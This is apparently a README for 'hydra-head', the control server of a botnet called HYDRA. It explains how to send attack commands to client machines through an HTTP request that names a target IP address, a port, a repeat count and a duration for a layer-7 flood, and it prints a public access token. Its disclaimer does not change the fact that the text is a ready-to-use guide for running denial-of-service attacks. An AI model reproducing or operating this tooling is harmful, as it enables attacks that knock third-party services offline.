# hydra-head
Head that manages HYDRA botnet clients<br>
Client (https://github.com/devsofvoid/hydra-client)<br>
<br>
# Usage<br>
In order to use a botnet, you must have at least one client<br>
<br>
An example of sending an attack request:<br>
`http://localhost:3000/?token=HEREMUSTBETOKEN&method=l7&target=109.71.9.87&port=80&repeats=10&duration=5`<br>
<br>
Token - You can create your token on the https://account.swizar.ru or use public key (`4OxfX3Jm45HaNcKh88VmVr0MrmiLsMTeGanWKddB`)<br>
Method - Choose the method by which you will attack (Available only l7)<br>
Target - Specify the target to be attacked (**without http:// or https://**, only domain)<br>
Port - Specify the target port<br>
Repeats - Specify repeats of attack<br>
Duration - Specify the attack duration (in minutes)<br>
<br>
# Disclaimer ⚠️<br>
This script is for informational purposes only. The author is not responsible for any damage caused.
